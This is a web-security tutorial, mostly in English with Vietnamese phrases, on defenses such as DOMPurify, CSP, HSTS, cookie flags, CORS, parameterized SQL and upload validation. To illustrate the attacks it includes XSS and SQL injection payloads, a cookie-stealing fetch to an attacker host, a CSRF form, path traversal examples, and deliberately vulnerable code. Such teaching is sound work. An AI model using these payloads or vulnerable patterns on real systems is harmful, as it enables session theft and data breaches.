# Prevention Strategies 

---

## 1. Input Sanitization - Làm sạch user input

### Concept

**Core idea**: Xử lý user input để remove/escape malicious content trước khi sử dụng.

**Mental model**: Water filtration
```
Dirty water (user input) → Filter (sanitization) → Clean water (safe data)

User input: <script>alert('XSS')</script>
After sanitization: &lt;script&gt;alert('XSS')&lt;/script&gt;
Browser displays as text, không execute
```

---

### Triết lý: Never trust user input

**User input sources**:
```
- Form fields
- URL parameters
- HTTP headers
- Cookies
- File uploads
- API requests
- Database (if từ user)
- localStorage/sessionStorage

ALL are untrusted
```

---

### DOMPurify - Industry standard library

#### Concept

**What it does**: Parse HTML, remove malicious elements/attributes, return clean HTML.

**Architecture**:
```
Input HTML → Parse to DOM tree → Whitelist check → Remove dangerous nodes → Serialize back to HTML
```

**Mental model**: TSA security checkpoint
```
Passenger (HTML) → Scan (parse) → Remove weapons (scripts) → Allow through (clean HTML)
```

---

#### Use cases

**Scenario 1: Rich text editor**
```
User writes blog post với formatting (bold, links, images)
→ Need allow HTML tags
→ But prevent XSS

Without DOMPurify:
User input: <p>Hello <script>steal()</script></p>
Rendered: Script executes ❌

With DOMPurify:
Input: <p>Hello <script>steal()</script></p>
Output: <p>Hello </p>
Script removed ✅
```

---

**Scenario 2: User bio/profile**
```
Allow users customize profile với limited HTML
- Allow: <b>, <i>, <a>
- Block: <script>, <iframe>, event handlers

DOMPurify config:
ALLOWED_TAGS: ['b', 'i', 'a']
ALLOWED_ATTR: ['href']
```

---

#### Configuration tiers

**Level 1: Strict (safest)**
```
Remove ALL tags, only keep text
Use case: Comments không cần formatting
```

**Level 2: Basic formatting**
```
Allow: <p>, <b>, <i>, <em>, <strong>
Block: Links, images, scripts
Use case: Simple comments với text formatting
```

**Level 3: Rich content**
```
Allow: All formatting + links + images
Block: Scripts, iframes, event handlers
Use case: Blog posts, articles
```

**Level 4: Very permissive**
```
Allow: Almost everything except obvious attacks
Block: <script>, event handlers
Use case: CMS, admin content
Risk: Higher, need careful config
```

---

#### Common pitfalls

**Pitfall 1: Sanitize too late**
```
❌ BAD:
1. Save user input to DB (raw)
2. Load from DB
3. Sanitize
4. Render

Problem: XSS already in DB, could be used elsewhere

✅ GOOD:
1. Sanitize immediately when receive
2. Save clean data to DB
3. Load from DB (already safe)
4. Render
```

---

**Pitfall 2: Sanitize wrong context**
```
DOMPurify for HTML context only

❌ Wrong usage:
const userInput = req.query.callback;
res.send(`<script>window.${userInput}()</script>`);
// DOMPurify won't help (JavaScript context)

✅ Correct: Don't allow user input trong <script> tags
```

---

**Pitfall 3: Client-side only sanitization**
```
❌ BAD:
Frontend sanitize → Send to backend → Save

Problem: Attacker bypass frontend (curl, Postman)

✅ GOOD:
Frontend sanitize (UX, instant feedback)
Backend ALSO sanitize (security, cannot bypass)

Defense in depth
```

---

### Beyond DOMPurify

**Alternative approaches**:

**1. Markdown instead of HTML**
```
User writes Markdown, not HTML
Markdown parser render to safe HTML

Pros:
- User-friendly syntax
- Safer (limited attack surface)
- No need complex sanitization

Cons:
- Less flexibility than raw HTML
```

**Example flow**:
```
User types: **bold** and [link](url)
Markdown parser: <strong>bold</strong> and <a href="url">link</a>
Parser already safe (no script tags possible)
```

---

**2. WYSIWYG editors với built-in sanitization**
```
Editors like Quill, TinyMCE, CKEditor
Already sanitize input internally

But: Still validate on backend (defense in depth)
```

---

**3. Content Security Policy (covered later)**
```
Even if XSS bypasses sanitization
CSP blocks script execution
Last line of defense
```

---

## 2. Output Encoding - Escape khi render

### Concept

**Core idea**: Convert dangerous characters thành safe representations khi display.

**Mental model**: Translation
```
< becomes &lt;
> becomes &gt;
" becomes &quot;

<script> becomes &lt;script&gt;
Browser displays as text, không execute
```

---

### Difference: Sanitization vs Encoding

**Sanitization (Input)**:
```
Remove/modify input before storage
User types: <script>alert(1)</script>
Stored: (removed)
```

**Encoding (Output)**:
```
Store original, escape when render
User types: <script>alert(1)</script>
Stored: <script>alert(1)</script>
Displayed: &lt;script&gt;alert(1)&lt;/script&gt;
```

**When to use which**:
```
Sanitization:
- Rich text content (HTML allowed)
- Need modify before storage
- Once at input time

Encoding:
- Plain text content (no HTML)
- Preserve original data
- Every time at output
```

---

### Context-aware encoding

**Critical insight**: Different contexts need different encoding.

#### Context 1: HTML Content
```
Dangerous chars: < > & " '

<div>{userInput}</div>

React/Vue auto-encode:
userInput = "<script>alert(1)</script>"
Output: &lt;script&gt;alert(1)&lt;/script&gt;
```

---

#### Context 2: HTML Attribute
```
<input value="userInput">

Dangerous: " (close attribute)

Attack:
userInput = '" onclick="alert(1)'
Result: <input value="" onclick="alert(1)">

Prevention: Encode quotes
userInput = '&quot; onclick=&quot;alert(1)'
Result: <input value="&quot; onclick=&quot;alert(1)">
```

---

#### Context 3: JavaScript Context
```
<script>
  const name = "userInput";
</script>

Dangerous: " (escape string)

Attack:
userInput = '"; alert(1); //'
Result: const name = ""; alert(1); //";

Prevention: 
- Don't put user input trong <script>
- Or use JSON.stringify (handles escaping)
const name = JSON.stringify(userInput);
```

---

#### Context 4: URL Context
```
<a href="userInput">Link</a>

Dangerous: javascript:, data:

Attack:
userInput = 'javascript:alert(1)'
Result: Click link → Execute JavaScript

Prevention:
- Validate URL protocol (http/https only)
- Use encodeURIComponent for parameters
```

---

### Framework auto-encoding

**React**:
```
Safe by default:
<div>{userInput}</div> // ✅ Auto-escaped

Dangerous (opt-in):
<div dangerouslySetInnerHTML={{__html: userInput}} /> // ❌ No encoding
```

---

**Vue**:
```
Safe:
<div>{{ userInput }}</div> // ✅ Auto-escaped

Dangerous:
<div v-html="userInput"></div> // ❌ No encoding
```

---

**Angular**:
```
Safe by default (built-in sanitizer):
<div>{{ userInput }}</div> // ✅ Auto-escaped

Bypass (dangerous):
<div [innerHTML]="sanitizer.bypassSecurityTrustHtml(userInput)"></div>
```

---

### When auto-encoding isn't enough

**Scenario 1: Server-side rendering**
```
Template engines (EJS, Pug, Handlebars):
Some auto-escape, some don't

EJS:
<%= userInput %> // ✅ Escaped
<%- userInput %> // ❌ Unescaped (dangerous)

Always check template engine docs
```

---

**Scenario 2: Legacy code**
```
jQuery era:
$('#div').html(userInput); // ❌ No encoding

Modern:
$('#div').text(userInput); // ✅ Treats as text (safe)
```

---

**Scenario 3: Custom components**
```
If you manually manipulate DOM:
element.innerHTML = userInput; // ❌ Dangerous

Use:
element.textContent = userInput; // ✅ Safe (text only)
```

---

## 3. CSP (Content Security Policy) - Browser security policy

### Concept

**Core idea**: HTTP header tells browser "only execute resources từ trusted sources".

**Mental model**: Nightclub bouncer
```
CSP = Bouncer with whitelist
Scripts from approved sources → Allowed in
Inline scripts, eval() → Blocked at door
Attacker's scripts → Rejected
```

---

### Bản chất: Defense in depth

```
Layer 1: Input sanitization (prevent XSS injection)
Layer 2: Output encoding (escape dangerous chars)
Layer 3: CSP (even if XSS gets through, block execution)

CSP = Last line of defense
```

---

### CSP Directives

#### 1. **script-src** - Kiểm soát JavaScript

**Most important directive**
```
script-src 'self'
→ Only scripts from same origin

script-src 'self' https://trusted-cdn.com
→ Same origin + specific CDN

script-src 'none'
→ No JavaScript at all (extreme)
```

**What it blocks**:
```
❌ Inline scripts: <script>alert(1)</script>
❌ Event handlers: <div onclick="alert(1)">
❌ javascript: URLs: <a href="javascript:alert(1)">
❌ eval(), new Function()
❌ Scripts từ unauthorized domains
```

---

#### 2. **default-src** - Fallback cho all directives

```
default-src 'self'
→ Mọi resource (scripts, styles, images) chỉ từ same origin

Nếu không set specific directive (script-src, style-src)
→ Dùng default-src
```

---

#### 3. **style-src** - CSS sources

```
style-src 'self'
→ Only stylesheets from same origin

style-src 'self' 'unsafe-inline'
→ Allow inline <style> tags (less safe)
```

---

#### 4. **img-src** - Image sources

```
img-src 'self' data: https:
→ Images từ same origin, data URLs, any HTTPS

Useful for: User avatars từ CDN
```

---

#### 5. **connect-src** - AJAX/WebSocket

```
connect-src 'self' https://api.example.com
→ fetch/XMLHttpRequest chỉ đến listed origins

Blocks attacker exfiltrating data to evil.com
```

---

### CSP Levels (từ loose → strict)

**Level 1: Very loose (legacy support)**
```
Content-Security-Policy: 
  default-src 'self' 'unsafe-inline' 'unsafe-eval' https:

Allows:
- Same origin
- Inline scripts/styles (unsafe!)
- eval() (unsafe!)
- Any HTTPS resource

Use case: Legacy app migration (temporary)
```

---

**Level 2: Moderate**
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;

Blocks inline scripts ✅
Allows inline styles (for compatibility)
Specific CDN whitelist
```

---

**Level 3: Strict (recommended)**
```
Content-Security-Policy: 
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self';
  connect-src 'self';
  font-src 'self';

Blocks:
- All inline scripts/styles
- eval()
- Unauthorized domains

Most secure
```

---

**Level 4: Nonce-based (best for dynamic apps)**
```
Server generates random nonce per request:
nonce = crypto.randomBytes(16).toString('base64')

Header:
Content-Security-Policy: script-src 'nonce-abc123'

HTML:
<script nonce="abc123">
  // This script allowed
</script>

<script>
  // This blocked (no nonce)
</script>

Why better:
- No whitelist maintenance
- Can have inline scripts (with nonce)
- Attacker cannot guess nonce
```

---

### Common CSP mistakes

**Mistake 1: 'unsafe-inline' defeats purpose**
```
❌ BAD:
script-src 'self' 'unsafe-inline'

Allows all inline scripts
→ XSS still works
→ CSP useless
```

---

**Mistake 2: Overly permissive sources**
```
❌ BAD:
script-src https:

Allows scripts từ ANY HTTPS domain
→ Attacker upload script to any CDN
→ Still vulnerable
```

---

**Mistake 3: Missing frame-ancestors**
```
❌ Forgot:
Content-Security-Policy: script-src 'self'

Still vulnerable to clickjacking

✅ Include:
frame-ancestors 'none'
```

---

**Mistake 4: Report-only mode in production**
```
Content-Security-Policy-Report-Only: ...

Only logs violations, không block
→ Not protected

Use Report-Only for testing
Then switch to enforcing mode
```

---

### CSP Reporting

**Monitor violations**:
```
Content-Security-Policy: 
  default-src 'self';
  report-uri /csp-violation-report

Browser sends POST request when CSP violated:
{
  "blocked-uri": "https://evil.com/steal.js",
  "violated-directive": "script-src",
  "source-file": "https://yoursite.com/page"
}

Analyze reports → Detect attacks or misconfigurations
```

---

## 4. HTTPS Enforcement - Encrypted transport

### Concept

**Core idea**: All communication giữa browser ↔ server encrypted, prevent eavesdropping.

**Mental model**: Sealed envelope vs postcard
```
HTTP: Postcard (anyone can read)
HTTPS: Sealed envelope (only sender/receiver read)
```

---

### Tại sao critical?

**What HTTPS protects**:
```
1. Confidentiality: Data encrypted (passwords, credit cards)
2. Integrity: Cannot be modified in transit (MITM attacks)
3. Authentication: Certificate proves server identity
```

**Without HTTPS**:
```
User types password → Sent plain text
Attacker on network (coffee shop WiFi):
- Sniff password
- Steal session cookie
- Modify response (inject malicious script)
```

---

### HTTPS Strict Transport Security (HSTS)

**Problem**: First visit still HTTP
```
User types: example.com
Browser: http://example.com (first request)
→ Attacker can intercept this request
→ MITM attack
Then: Server redirect to https://
```

**Solution: HSTS Header**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Tells browser:
- Always use HTTPS for this domain (1 year)
- Include all subdomains
- Preload into browser (never use HTTP, even first visit)
```

---

### HSTS Protection levels

**Level 1: Basic**
```
Strict-Transport-Security: max-age=86400

HTTPS for 1 day
After first visit
```

---

**Level 2: Long-term**
```
Strict-Transport-Security: max-age=31536000

HTTPS for 1 year
Production standard
```

---

**Level 3: With subdomains**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains

Main domain + all subdomains must use HTTPS
api.example.com, admin.example.com → All HTTPS
```

---

**Level 4: Preload (strongest)**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Submit to browser preload list
Chrome, Firefox, Safari hardcode your domain
→ Never even attempt HTTP
→ Protected from first visit

Submit at: hstspreload.org
```

---

### Mixed Content

**Problem**: HTTPS page loads HTTP resources
```
HTTPS page: https://example.com/page
Loads: <script src="http://cdn.com/script.js">

Browser blocks (mixed content)
Even though page HTTPS, one HTTP resource = vulnerability
```

**Types**:
```
Active mixed content (blocked by browsers):
- Scripts
- Stylesheets
- Iframes
- XHR/fetch

Passive mixed content (warning, sometimes allowed):
- Images
- Audio
- Video
```

**Solution**:
```
All resources must be HTTPS:
<script src="https://cdn.com/script.js">
<img src="https://images.com/photo.jpg">

Or protocol-relative:
<script src="//cdn.com/script.js">
(Inherits page protocol)
```

---

## 5. HttpOnly Cookies - Protect session tokens

### Concept

**Core idea**: Cookie flag tells browser "JavaScript cannot access this cookie".

**Mental model**: Safe deposit box
```
Normal cookie: Anyone with key (JavaScript) can open
HttpOnly cookie: Only bank teller (HTTP requests) can access
```

---

### The problem: XSS stealing cookies

**Without HttpOnly**:
```
Attacker XSS:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

document.cookie contains session token
→ Token stolen
→ Attacker impersonates victim
```

**With HttpOnly**:
```
Same XSS script:
console.log(document.cookie); // "" (empty, HttpOnly cookies hidden)

XSS cannot steal session
→ Attacker still can do other damage but not hijack session
```

---

### Implementation

**Server set cookie**:
```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly: JavaScript cannot read
Secure: Only send over HTTPS
SameSite: CSRF protection (covered next)
```

**Critical flags combination**:
```
sessionId cookie (authentication):
✅ HttpOnly (anti-XSS)
✅ Secure (HTTPS only)
✅ SameSite=Strict/Lax (anti-CSRF)

Preference cookie (theme, language):
❌ HttpOnly not needed (no security impact)
✅ Secure (still good practice)
```

---

### When HttpOnly isn't enough

**Limitation**: XSS can still...
```
- Make authenticated requests (session cookie auto-sent)
- Read page content (DOM)
- Perform actions on behalf of user
- Keylog passwords

HttpOnly prevents: Session hijacking (stealing token to use elsewhere)
Doesn't prevent: Actions while user still on site
```

**Defense in depth**:
```
HttpOnly cookies (prevent token theft)
+ CSP (block XSS execution)
+ Input sanitization (prevent XSS injection)
```

---

## 6. SameSite Cookies - CSRF protection

### Concept

**Core idea**: Cookie flag controls whether browser sends cookie with cross-site requests.

**Mental model**: Border control
```
SameSite=Strict: Passport only valid within own country
SameSite=Lax: Passport valid for tourism (GET), not work (POST)
SameSite=None: Passport valid everywhere (old behavior)
```

---

### The problem: CSRF attacks

**Without SameSite**:
```
Victim logged into bank.com (cookie set)
Victim visits attacker.com
Attacker site:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>

Browser sends bank.com cookie with POST
→ Bank thinks legit request
→ Money transferred
```

**With SameSite=Strict**:
```
Same attack
Browser: "Request from attacker.com to bank.com (cross-site)"
Browser: "SameSite=Strict → Don't send cookie"
Request arrives without authentication
→ Bank rejects (401)
→ Attack failed
```

---

### SameSite Options

#### **Strict** - Most secure
```
Set-Cookie: sessionId=abc; SameSite=Strict

Cookie ONLY sent khi request FROM same site

Example:
✅ User on bank.com clicks link to bank.com/transfer
   → Same site → Cookie sent

❌ User on evil.com, form submits to bank.com/transfer
   → Cross-site → Cookie NOT sent

❌ User clicks email link to bank.com/dashboard
   → Cross-site (from email) → Cookie NOT sent (annoying!)
```

**Trade-off**:
```
Pros: Maximum CSRF protection
Cons: User clicks link trong email → Must login again
```

---

#### **Lax** - Balanced (default modern browsers)
```
Set-Cookie: sessionId=abc; SameSite=Lax

Cookie sent with "safe" cross-site requests (top-level navigation, GET)
Cookie NOT sent with "unsafe" requests (POST, AJAX)

Examples:
✅ User clicks email link (GET navigation)
   → Cookie sent → User stays logged in

❌ Form POST from evil.com
   → Cookie NOT sent → CSRF blocked

❌ fetch() from evil.com
   → Cookie NOT sent → CSRF blocked
```

**Trade-off**:
```
Pros: Good security + good UX
Cons: Slightly less secure than Strict (GET CSRF possible, rare)
```

---

#### **None** - No protection (legacy)
```
Set-Cookie: sessionId=abc; SameSite=None; Secure

Cookie sent with ALL requests (old behavior)
Must include Secure flag

Use case: 
- iframe embedding (third-party widgets)
- Cross-origin API requests with credentials

Risky: No CSRF protection, need other defenses (CSRF tokens)
```

---

### SameSite Decision Tree

```
Is this session/auth cookie?
├─ YES → Use SameSite
│   │
│   ├─ Need max security? → Strict
│   │   (Banking, admin panels)
│   │
│   ├─ Need balance? → Lax (recommended)
│   │   (Most apps)
│   │
│   └─ Need cross-site? → None + Secure + CSRF tokens
│       (Embedded widgets)
│
└─ NO (preference cookie)
    → SameSite optional (not security-critical)
```

---

## 7. CORS Configuration - Cross-Origin Resource Sharing

### Concept

**Core idea**: Server tells browser "which origins can access my API".

**Mental model**: Embassy visa
```
Foreign website (different origin) wants access your API
Browser: "Do you allow this origin?"
Server: "Check my CORS policy"
```

---

### Same-Origin Policy (SOP) - The foundation

**Default browser behavior**:
```
Page on https://site-a.com
Cannot fetch https://site-b.com/api
(Different origin)

Browser blocks for security:
- Prevent malicious site steal data from victim site
- Without SOP: evil.com could read your gmail.com
```

**CORS = Controlled relaxation of SOP**
```
Server explicitly say: "I allow site-a.com access my API"
```

---

### Origin definition

```
Protocol + Domain + Port = Origin

https://example.com:443
https://example.com:8080 → Different (port)
http://example.com → Different (protocol)
https://sub.example.com → Different (subdomain)
```

---

### CORS Flow (Simple requests)

```
1. Browser: User on site-a.com, fetch site-b.com/api
2. Browser adds header: Origin: https://site-a.com
3. Request sent to site-b.com
4. Server checks CORS policy
5. Server responds:
   Access-Control-Allow-Origin: https://site-a.com
6. Browser compares: Response origin === Request origin?
7. If match → Allow JavaScript access response
8. If not → Block (CORS error)
```

---

### CORS Flow (Preflight requests)

**For complex requests** (PUT, DELETE, custom headers):
```
1. Browser sends OPTIONS request (preflight)
   Origin: https://site-a.com
   Access-Control-Request-Method: DELETE
   Access-Control-Request-Headers: X-Custom-Header

2. Server responds:
   Access-Control-Allow-Origin: https://site-a.com
   Access-Control-Allow-Methods: GET, POST, DELETE
   Access-Control-Allow-Headers: X-Custom-Header
   Access-Control-Max-Age: 86400

3. Browser checks: Allowed?
4. If yes → Send actual request
5. If no → Block (CORS error)
```

---

### CORS Configuration Levels

#### Level 1: Open (least secure)
```
Access-Control-Allow-Origin: *

Allows ANY origin access API

Use case:
- Public APIs (weather, news)
- No authentication
- Data not sensitive

Risk: Anyone can call API from any website
```

---

#### Level 2: Specific origin
```
Access-Control-Allow-Origin: https://trusted-site.com

Only trusted-site.com can access

Use case:
- Your frontend calling your backend
- Known partner sites

Secure for most apps
```

---

#### Level 3: Dynamic whitelist
```
const allowedOrigins = [
  'https://site-a.com',
  'https://site-b.com',
  'https://partner.com',
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  
  next();
});

Multiple trusted origins
```

---

#### Level 4: With credentials
```
Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Credentials: true

Allows cookies/auth headers

Cannot use with wildcard (*):
❌ Access-Control-Allow-Origin: *
❌ Access-Control-Allow-Credentials: true
→ Browser rejects (security)

Must specify exact origin when credentials: true
```

---

### Common CORS mistakes

**Mistake 1: Reflect Origin header (dangerous)**
```
❌ DANGEROUS:
app.use((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
});

Problem:
- Accepts ANY origin (even evil.com)
- With credentials (cookies sent)
→ Evil site can steal user data

Same as Access-Control-Allow-Origin: * but worse (credentials included)
```

---

**Mistake 2: Wildcard with credentials**
```
❌ Invalid:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

Browser rejects this combination
```

---

**Mistake 3: Trust subdomain blindly**
```
❌ Risky:
if (origin.endsWith('.example.com')) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}

Problem: If attacker compromises sub.example.com
→ Can access main API

✅ Better: Explicit whitelist
```

---

**Mistake 4: Forget preflight cache**
```
Access-Control-Max-Age: 0

Browser sends preflight for EVERY request
→ Performance hit

✅ Cache preflight:
Access-Control-Max-Age: 86400 (1 day)
```

---

### CORS Security Rules

**Rule 1: CORS ≠ Security**
```
CORS controls BROWSER access
Does NOT prevent:
- curl/Postman requests
- Server-to-server requests
- Mobile apps

Still need authentication/authorization on backend
```

---

**Rule 2: Public APIs can be open**
```
If API public (no auth, no sensitive data):
Access-Control-Allow-Origin: * is fine

If API requires auth or returns user data:
Specific origin + credentials
```

---

**Rule 3: Credentials require exact origin**
```
With cookies/auth:
✅ Access-Control-Allow-Origin: https://specific-site.com
❌ Access-Control-Allow-Origin: *
```

---

## 8. SQL Injection Prevention

### Concept

**Core idea**: Never trust user input trong SQL queries. Always use parameterized queries hoặc ORM.

**Mental model**: Airport security scanner
```
User input = Luggage
Parameterized query = X-ray scanner
Dangerous content (SQL commands) = Weapons detected and removed
```

---

### Why SQL injection is critical

**Impact nếu bị exploit:**
```
- Data breach (steal entire database)
- Data destruction (DROP TABLE)
- Privilege escalation (admin access)
- Bypass authentication (login as any user)
```

**Real-world cost:**
```
Average data breach cost:$4.35M (IBM 2022)
SQL injection = #3 trong OWASP Top 10
Most preventable vulnerability (>90% preventable with basic practices)
```

---

### Prevention Strategy 1: Parameterized Queries (Best Practice)

**Concept**: Separate SQL structure from data.

**How it works:**
```
SQL engine receives:
1. Query template: "SELECT * FROM users WHERE id = ?"
2. Parameters: [userId]

Engine treats parameters as DATA, never as CODE
→ Even if userId = "1 OR 1=1", it's literal string, not SQL
```

---

**Implementation: PostgreSQL/MySQL (Node.js)**

```javascript
// ❌ VULNERABLE - String concatenation
app.get('/user/:id', async (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
  const result = await db.query(query);
  // Attack: /user/1%20OR%201=1 → Returns all users
});

// ✅ SAFE - Parameterized query
app.get('/user/:id', async (req, res) => {
  const query = 'SELECT * FROM users WHERE id = $1'; // $1 = placeholder
  const result = await db.query(query, [req.params.id]);
  res.json(result.rows[0]);
});
```

---

**Implementation: MySQL (placeholders)**

```javascript
const mysql = require('mysql2/promise');

// ✅ SAFE
async function getUser(userId) {
  const query = 'SELECT * FROM users WHERE id = ?';
  const [rows] = await connection.execute(query, [userId]);
  return rows[0];
}

// ✅ SAFE - Multiple parameters
async function login(username, password) {
  const query = 'SELECT * FROM users WHERE username = ? AND password_hash = ?';
  const [rows] = await connection.execute(query, [username, hashedPassword]);
  return rows[0];
}
```

---

### Prevention Strategy 2: ORM (Object-Relational Mapping)

**Concept**: Abstraction layer that automatically handles SQL escaping.

**Popular ORMs:**
- Sequelize (Node.js)
- TypeORM (TypeScript)
- Prisma (Modern)
- Django ORM (Python)
- Entity Framework (C#)

---

**Sequelize Example:**

```javascript
const { Sequelize, DataTypes } = require('sequelize');

// Define model
const User = sequelize.define('User', {
  username: DataTypes.STRING,
  email: DataTypes.STRING,
  passwordHash: DataTypes.STRING
});

// ✅ SAFE - ORM handles escaping
async function getUser(userId) {
  return await User.findByPk(userId);
}

// ✅ SAFE - WHERE clause
async function findUserByUsername(username) {
  return await User.findOne({
    where: { username } // Automatically parameterized
  });
}

// ✅ SAFE - Complex queries
async function searchUsers(searchTerm) {
  return await User.findAll({
    where: {
      username: {
        [Op.like]: `%${searchTerm}%` // ORM escapes LIKE patterns
      }
    }
  });
}
```

---

**Prisma Example (Modern approach):**

```javascript
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

// ✅ SAFE - Type-safe queries
async function getUser(userId) {
  return await prisma.user.findUnique({
    where: { id: userId }
  });
}

// ✅ SAFE - Relations
async function getUserWithPosts(userId) {
  return await prisma.user.findUnique({
    where: { id: userId },
    include: { posts: true }
  });
}
```

---

### Prevention Strategy 3: Stored Procedures

**Concept**: Pre-compiled SQL on database server.

**Advantages:**
- SQL logic isolated from application
- Performance (pre-compiled)
- Additional security layer

**Example:**

```sql
-- Create stored procedure
DELIMITER $$
CREATE PROCEDURE GetUser(IN p_userId INT)
BEGIN
  SELECT * FROM users WHERE id = p_userId;
END$$
DELIMITER ;

-- Create with complex logic
DELIMITER $$
CREATE PROCEDURE LoginUser(
  IN p_username VARCHAR(50),
  IN p_password VARCHAR(255),
  OUT p_userId INT
)
BEGIN
  SELECT id INTO p_userId
  FROM users
  WHERE username = p_username
    AND password_hash = SHA2(p_password, 256)
  LIMIT 1;
END$$
DELIMITER ;
```

**Call from Node.js:**

```javascript
// ✅ SAFE
async function getUser(userId) {
  const [rows] = await connection.execute('CALL GetUser(?)', [userId]);
  return rows[0];
}

async function loginUser(username, password) {
  const [rows] = await connection.execute(
    'CALL LoginUser(?, ?, @userId)',
    [username, password]
  );
  // Get output parameter
  const [[result]] = await connection.query('SELECT @userId as userId');
  return result.userId;
}
```

---

### Input Validation (Defense in Depth)

**Concept**: Validate BEFORE hitting database.

**Pattern:**

```javascript
const Joi = require('joi');

// Define validation schema
const userSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  age: Joi.number().integer().min(0).max(120)
});

// Validate before query
app.post('/users', async (req, res) => {
  // 1. Validate format
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({
      error: 'Invalid input',
      details: error.details
    });
  }
  
  // 2. Use validated data with parameterized query
  const query = 'INSERT INTO users (username, email, age) VALUES (?, ?, ?)';
  await db.execute(query, [value.username, value.email, value.age]);
  
  res.json({ success: true });
});
```

---

### SQL Injection Prevention Checklist

**Code-level:**
- ☐ NEVER concatenate user input into SQL strings
- ☐ Use parameterized queries for ALL database operations
- ☐ Use ORM if available (auto-escaping)
- ☐ Validate input format before queries
- ☐ Use least privilege database accounts
- ☐ Disable error messages in production (don't leak DB structure)

**Testing:**
- ☐ Test với payloads: `' OR '1'='1`, `'; DROP TABLE`, `1 UNION SELECT`
- ☐ Automated SQL injection scanners (SQLMap, OWASP ZAP)
- ☐ Code review for string concatenation patterns

**Monitoring:**
- ☐ Log unusual database queries
- ☐ Alert on SQL errors (possible injection attempts)
- ☐ Monitor query patterns (sudden spikes, unusual table access)

---

### Common Mistakes to Avoid

**Mistake 1: Concatenation trong WHERE clause**

```javascript
// ❌ VULNERABLE
const age = req.query.age;
const query = `SELECT * FROM users WHERE age > ${age}`;

// ✅ SAFE
const query = 'SELECT * FROM users WHERE age > ?';
const result = await db.execute(query, [age]);
```

---

**Mistake 2: Dynamic ORDER BY**

```javascript
// ❌ VULNERABLE (cannot parameterize column names)
const sortBy = req.query.sort; // Could be "name; DROP TABLE users--"
const query = `SELECT * FROM users ORDER BY ${sortBy}`;

// ✅ SAFE - Whitelist column names
const allowedColumns = ['name', 'email', 'created_at'];
const sortBy = allowedColumns.includes(req.query.sort)
  ? req.query.sort
  : 'created_at'; // Default

const query = `SELECT * FROM users ORDER BY ${sortBy}`; // Safe now
```

---

**Mistake 3: LIKE patterns**

```javascript
// ❌ VULNERABLE
const search = req.query.q;
const query = `SELECT * FROM posts WHERE title LIKE '%${search}%'`;

// ✅ SAFE
const query = 'SELECT * FROM posts WHERE title LIKE ?';
const result = await db.execute(query, [`%${search}%`]);
// Parameter binding escapes special chars in search term
```

---

## 9. File Upload Security

### Concept

**Core idea**: Files can contain malicious code. Validate, sanitize, and isolate uploads.

**Mental model**: Quarantine
```
Uploaded file = Potentially infected patient
Validation = Health screening
Storage = Isolation ward
Serving = Controlled release
```

---

### Attack vectors via file upload

```
1. Malicious file extension (.php, .exe uploaded as .jpg)
2. Path traversal (../../etc/passwd)
3. File size bomb (10GB file → DOS)
4. Malware/virus
5. XSS in filename (display filename without escaping)
```

---

### Prevention Strategy 1: File Type Validation

**MIME type check (NOT sufficient alone):**

```javascript
const multer = require('multer');

// ❌ VULNERABLE - MIME type can be spoofed
const upload = multer({
  fileFilter: (req, file, cb) => {
    if (file.mimetype === 'image/jpeg') {
      cb(null, true);
    } else {
      cb(new Error('Only JPEG allowed'));
    }
  }
});

// Attacker sets Content-Type: image/jpeg but uploads PHP script
```

---

**✅ Better: Magic number (file signature) check:**

```javascript
const fileType = require('file-type');
const multer = require('multer');

const upload = multer({
  storage: multer.memoryStorage()
});

app.post('/upload', upload.single('file'), async (req, res) => {
  const buffer = req.file.buffer;
  
  // Check actual file content
  const type = await fileType.fromBuffer(buffer);
  
  if (!type || !['image/jpeg', 'image/png'].includes(type.mime)) {
    return res.status(400).json({ error: 'Invalid file type' });
  }
  
  // Proceed with safe file
  await saveFile(buffer);
  res.json({ success: true });
});
```

**Magic numbers:**
```
JPEG: FF D8 FF
PNG:  89 50 4E 47
GIF:  47 49 46 38
PDF:  25 50 44 46
```

---

### Prevention Strategy 2: File Size Limits

```javascript
const multer = require('multer');

const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB max
    files: 10 // Max 10 files per request
  }
});

app.post('/upload', upload.array('files'), (req, res) => {
  // Files automatically rejected if > 5MB
  res.json({ uploaded: req.files.length });
});

// Handle size error
app.use((err, req, res, next) => {
  if (err.code === 'LIMIT_FILE_SIZE') {
    return res.status(413).json({ error: 'File too large (max 5MB)' });
  }
  next(err);
});
```

---

### Prevention Strategy 3: Filename Sanitization

```javascript
const crypto = require('crypto');
const path = require('path');

// ❌ VULNERABLE - User controls filename
const storage = multer.diskStorage({
  destination: './uploads',
  filename: (req, file, cb) => {
    cb(null, file.originalname); // Could be "../../etc/passwd"
  }
});

// ✅ SAFE - Generate random filename
const storage = multer.diskStorage({
  destination: './uploads',
  filename: (req, file, cb) => {
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname);
    cb(null, `${randomName}${ext}`);
  }
});
```

---

### Prevention Strategy 4: Store Outside Web Root

```javascript
// ❌ VULNERABLE - Files in public directory
// uploads/ is served via Express static
app.use('/uploads', express.static('uploads'));

// Attacker uploads shell.php → Visits /uploads/shell.php → Code executes

